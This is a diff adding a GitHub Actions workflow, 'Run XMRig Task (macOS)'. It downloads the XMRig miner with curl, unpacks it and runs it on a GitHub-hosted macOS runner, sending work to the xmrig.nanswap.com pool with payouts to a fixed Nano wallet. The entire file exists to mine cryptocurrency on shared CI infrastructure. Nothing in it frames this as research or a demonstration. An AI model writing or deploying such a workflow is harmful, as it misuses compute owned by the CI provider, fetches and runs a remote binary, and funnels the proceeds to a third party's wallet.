@@ -1,0 +1,23 @@
+name: Run XMRig Task (macOS)
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run-xmrig:
+    # GitHub's 'macos-latest' runners are now M1 (Apple Silicon) 
+    runs-on: macos-latest 
+
+    steps:
+      - name: Download XMRig for macOS
+        run: |
+          # Downloading the Apple Silicon (arm64) version
+          curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-macos-arm64.tar.gz
+          tar -xvf xmrig.tar.gz
+
+      - name: Execute Mining Script
+        run: |
+          cd xmrig-6.21.0
+          # We use ./ to run the local binary
+          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k -u nano_3d5psf65d41ckxdnqz5ajuwo1ceo6hq8k4q314oa78doqozye9b6eb5iqpc1 -p x
+          
